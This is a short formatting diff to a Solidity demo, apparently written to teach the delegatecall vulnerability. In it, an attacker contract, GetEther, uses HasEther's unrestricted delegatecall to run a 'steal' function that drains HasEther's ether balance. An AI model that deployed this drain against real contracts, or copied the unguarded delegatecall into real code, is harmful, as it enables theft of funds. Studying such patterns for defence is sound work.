@@ -10,13 +10,11 @@ contract GetEther {
     function getEther(HasEther hasEther) external {
         //...
 
-        bytes memory data = abi.encodeWithSignature(
-            "steal(address)",
-            address(this)
-        );
+        bytes memory data = abi.encodeWithSignature("steal(address)", address(this));
 
         hasEther.action(address(this), data);
     }
+
     function steal(address to) external {
         payable(to).transfer(address(this).balance);
     }
@@ -36,7 +34,7 @@ contract HasEther {
         // called caller
         //like here DelegateCall will run the code of GetEther but will use the stroage, balance of
         //HasEther
-        (bool success, ) = address(to).delegatecall(data);
+        (bool success,) = address(to).delegatecall(data);
         require(success, "Action failed");
     }
 }
